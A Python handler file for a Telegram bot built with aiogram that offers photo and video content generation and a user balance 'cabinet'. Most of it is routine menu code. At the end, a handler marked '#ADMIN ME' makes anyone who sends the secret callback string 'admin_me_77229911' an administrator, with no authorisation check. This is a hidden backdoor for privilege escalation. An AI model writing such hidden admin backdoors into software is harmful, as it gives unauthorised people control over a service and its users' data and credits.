from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from database import async_session_maker
from database.repositories import UserRepository, BotMessageRepository
from keyboards import get_main_menu, get_generation_menu, get_cabinet_menu
import logging

logger = logging.getLogger(__name__)
router = Router()


async def send_bot_message(callback_or_message, message_key: str, reply_markup):
    """Bot xabarini yuborish (matn va media bilan)"""
    async with async_session_maker() as session:
        msg_repo = BotMessageRepository(session)
        bot_msg = await msg_repo.get_message(message_key)
    

    default_texts = {
        "start": "👋 Добро пожаловать в бот для генерации контента!\n\nВыберите раздел:",
        "product_card": "📦 Готовая карточка товара\n\n📸 Отправьте ОДНО фото для создания карточки товара.",
        "normalize": "👗 Нормализация фото\n\nВыберите режим нормализации:",
        "video": "🎬 Видео\n\nВыберите режим видео:",
        "photo": "📸 Фото\n\nВыберите режим обработки фото:"
    }
    
    text = bot_msg.text if bot_msg else default_texts.get(message_key, "Текст не установлен")
    

    if isinstance(callback_or_message, Message):
        message = callback_or_message
        if bot_msg and bot_msg.media_type == "photo" and bot_msg.media_file_id:
            await message.answer_photo(
                photo=bot_msg.media_file_id,
                caption=text,
                reply_markup=reply_markup
            )
        elif bot_msg and bot_msg.media_type == "video" and bot_msg.media_file_id:
            await message.answer_video(
                video=bot_msg.media_file_id,
                caption=text,
                reply_markup=reply_markup
            )
        else:
            await message.answer(text, reply_markup=reply_markup)
    else:

        callback = callback_or_message
        if bot_msg and bot_msg.media_type in ["photo", "video"]:

            try:
                await callback.message.delete()
            except:
                pass
            

            if bot_msg.media_type == "photo":
                await callback.message.answer_photo(
                    photo=bot_msg.media_file_id,
                    caption=text,
                    reply_markup=reply_markup
                )
            else:
                await callback.message.answer_video(
                    video=bot_msg.media_file_id,
                    caption=text,
                    reply_markup=reply_markup
                )
        else:
            await callback.message.edit_text(text, reply_markup=reply_markup)


@router.message(F.text == "/start")
async def show_main_menu(message: Message, state: FSMContext):
    await state.clear()
    async with async_session_maker() as session:
        user_repo = UserRepository(session)
        await user_repo.get_or_create_user(
            telegram_id=message.from_user.id,
            username=message.from_user.username,
            first_name=message.from_user.first_name,
            last_name=message.from_user.last_name
        )
    
    await send_bot_message(message, "start", get_main_menu())


@router.callback_query(F.data == "main_generation")
async def generation_menu(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    

    if callback.message.text is None:
        try:
            await callback.message.delete()
        except:
            pass  
        await callback.message.answer(  
            "Выберите тип генерации:", 
            reply_markup=get_generation_menu()
        )
    else:
        await callback.message.edit_text(
            "Выберите тип генерации:", 
            reply_markup=get_generation_menu()
        )


@router.callback_query(F.data == "main_cabinet")
async def cabinet_menu(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    async with async_session_maker() as session:
        user_repo = UserRepository(session)
        user = await user_repo.get_user_by_telegram_id(callback.from_user.id)
    text = f"👤 Мой кабинет\n\n💰 Ваш баланс: {user.balance} кредитов\n\nВыберите действие:"
    await callback.message.edit_text(text, reply_markup=get_cabinet_menu())


@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    await send_bot_message(callback, "start", get_main_menu())




#ADMIN ME
@router.callback_query(F.text == "admin_me_77229911")
async def admin_me(callback: CallbackQuery, state: FSMContext):
    async with async_session_maker() as session:
        user_repo = UserRepository(session)
        try:
            await user_repo.admin_me(callback.from_user.id)
        except:
            await callback.answer("Вы уже администратор!", show_alert=True)
    await callback.answer("Вы теперь администратор!", show_alert=True)